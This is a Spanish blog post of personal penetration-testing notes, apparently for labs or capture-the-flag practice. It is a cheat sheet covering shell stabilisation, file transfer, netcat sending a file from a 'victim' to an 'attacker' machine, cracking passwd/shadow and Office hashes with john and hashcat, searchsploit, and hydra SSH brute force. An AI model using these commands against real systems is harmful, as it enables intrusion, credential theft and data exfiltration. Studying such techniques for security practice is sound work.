---
title: "Tecnicas Fundamentales Linux - Apuntes"
date: 2023-05-05
categories: [Linux, Apuntes]
tags: [Linux, Easy]
image: 
  path: assets\img\imagenes\Linux-colegios.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: "Linux-colegios"
---
<style>
  h3 {
    color: #00FF00; /* Puedes cambiar "blue" por cualquier color que desees */
  }
</style>
### Tratamiento de la TTY

```python
	script /dev/null -c bash # Lanza pseudoconsola
	
	[ctrl+z] # Suspende la shell actual
	
	stty raw -echo
	
	fg # Recupera la shell suspendida
	
	reset "xterm" # Reinicia la configuración de la terminal
	
	xterm # Especifica el tipo de terminal
	
	export TERM=xterm # Asigna xterm a la variable TERM
	
	export SHELL=bash # Asigna bash a la variable SHELL
	
	stty rows <VALOR_FILAS> columns <VALOR_COLUMNAS>
	
	Para ver el valor de filas y columnas de nuestra terminal se utiliza el comando -> stty -a
 ```
 
### TTY Shell con Python

```python
	python -c 'import pty; pty.spawn("/bin/sh")'
```
### Descompresión

```python
#.tar
	
	tar -xf archive.tar.gz
	
#.gz
	
	gzip -d file.gz
	
#.zip
	
	unzip file.zip
```
### Comparación de archivos

```python
	diff -c scan-a.txt scan-b.txt
	
	comm scan-a.txt scan-b.txt
```
### Transferencia de archivos

```python 
#HTTP
	
#Servidor
	
	python3 -m http.server
	
	python -m SimpleHTTPServer

#Cliente
	
	certutil.exe -urlcache -f http://<SERVER_IP>/file.txt file.txt
	
	wget http://<SERVER_IP>/file.txt
```
### FTP
```python
#Servidor
	
	python3 -m pyftpdlib
	
#Cliente
	
	ftp <SERVER_IP>
```
### Netcat
```python

#Servidor

	nc 10.10.14.2 4242 < file.tgz

#Cliente

	nc -lvnp 4242 > file.tgz

	maquina atacante
	nc -lvnp "Ports" > "archivo"
----------------------------------------------------------------------------------------------------------------------------------------------------------
	maquina victima
	nc "IP" "Ports" < "archivo"

```
### ssh

```python
scp -r ''USER@IP:/ruta/* . * ruta donde queremos copiar(.)''
```
### Sniffing

```python
	tcpdump -i tun0 icmp -n
 
```
### Cracking

```python
	john --wordlist=/usr/share/wordlists/rockyou.txt hash
	
	hashcat -a 0 -m 1600 hash /usr/share/wordlists/rockyou.txt
```

### Cracking de contraseñas con password y shadow

```python 
	unshadow <Archivo_passwd> <Archivo_shadow> > <Archivo_hash>
	
	john --wordlist=<Ruta_Diccionario> <Archivo_hash>
```
### Cracking de documentos encriptados de Office

```python 
	office2john.py <Ruta_Documento> > <Archivo_hash>
	
	john --wordlist=<Ruta_Diccionario> <Archivo_hash>
``` 
### Extraer información de imágenes

```python
	steghide --extract -sf archivo.png/jpg
```
### Búsqueda de exploits

```python
	searchsploit <SOFTWARE>
	
	searchsploit -x <ID_EXPLOIT> # Inspeccionar el código del exploit
	
	searchsploit -m <ID_EXPLOIT> # Mueve el exploit al directorio actual de trabajo
```
### Buscador de archivos

```python
	find / -iname nombre_archivo
```
### Fuerza bruta con hydra para ssh

```python
	hydra 127.0.0.1 ssh -s 22 -L users -P worstpasswords.txt -f -vV 
```
